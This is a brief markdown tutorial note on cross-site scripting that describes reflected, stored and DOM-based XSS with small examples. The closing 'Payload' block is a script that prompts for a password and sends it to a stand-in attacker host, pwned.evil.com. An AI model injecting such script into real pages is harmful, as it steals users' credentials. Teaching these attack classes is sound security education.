# Cross Site Scripting (XSS)

There are 3 common forms of XSS: reflected, stored and DOM based XSS

## Reflected XSS

When the input is immediately used in a web app. 

Example: textbox prompting for you to write your name and a display that says "HI:--------------- " as you write your name the dash are replaced by your input.

The code is executed "immediately" as you use it in the page.

## Stored XSS

When code is inserted in database and might be rendered when a user opens a forum board or comments section.

database:

```
ID|Message
-----------
123|<script></script>
```

## DOM based XSS

This is one the of the stealthiest attack as it is not stored in server logs.

```
<img src="pwnd" onerror="alert('XSS')">
```

### Payload

```
<script>
  var passwd=prompt("Gimme your password, PLZ!");
  var xhr=new XMLHttpRequest();
  xhr.open("GET","https://pwned.evil.com/log?password=".concat(encodeURI(passwd)));
  xhr.send();
</script>
```

